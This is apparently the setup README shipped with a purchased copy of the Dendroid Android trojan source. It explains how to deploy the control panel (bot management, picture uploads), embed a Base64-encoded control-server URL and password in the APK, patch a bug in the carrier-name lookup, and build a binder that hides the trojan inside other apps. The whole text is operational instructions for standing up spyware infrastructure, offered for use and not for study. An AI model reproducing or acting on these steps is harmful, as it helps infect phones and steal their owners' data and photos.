Thank You For Purchasing The Dendroid Source!

Requirements:
Web server with PHP and MySql
phpmyadmin (Easy DB setup)
OpenJDK JRE x64
Java JDK (If on x64 Windows you need to set the environment variable JAVA_HOME C:\Program Files\Java\JDK***

Web Panel Setup:
Extract Dendroid Panel
Move all files to your web server or httdocs if following setup video
Set correct permissions (Linux)
Change URL to your web server in reg.php

Change URL to your web server in Following Files, E.G http://127.0.0.1/:
applysettings.php
blockbot.php
clearawaiting.php (Also add <?php to first line)
clearmessages.php (Also add <?php to first line)
deletebot.php
deletefile.php
deletepics.php
functions.php
table.php

Change Password in following files to your password of your DB:
get.php
get-functions.php
new-upload.php
upload-pictures.php

Finally:
Go to your webserver Example: http://127.0.0.1
Follow Setup and Create Database

Database Setup:
Start phpmyadmin
Add new database (all settings must match your panel)
Set correct user and password on both panel and DB

APK Setup:
Open MyService.java
Look for encodedURL (Base64 Encrypted URL) add your url (Base64 Encoded)
backupURL same as above
encodedPassword must match one on DB & in Files for correct configuration (Base64 Encoded)
Make sure your URL does not have a final / E.G http://127.0.0.1

APK Fix: (Blank Space in URL Error)
Go To Line 275 : 17 In Eclipse and change following:
provider = telephonyManager.getNetworkOperatorName(); to
provider = removeBlankSpace(new StringBuilder(telephonyManager.getNetworkOperatorName()));

Go To Line 2326 : 5 In Eclipse and add following code:
static String removeBlankSpace(StringBuilder sb) {
	    int j = 0;
	    for(int i = 0; i < sb.length(); i++) {
	      if (!Character.isWhitespace(sb.charAt(i))) {
	         sb.setCharAt(j++, sb.charAt(i));
	      }
	    }
	    sb.delete(j, sb.length());
	    return sb.toString();
	 }
The above fix has been added to the apk source.
APK Binder(VBnet) Still working on this:
Download Visual Studio Express and Compile :)
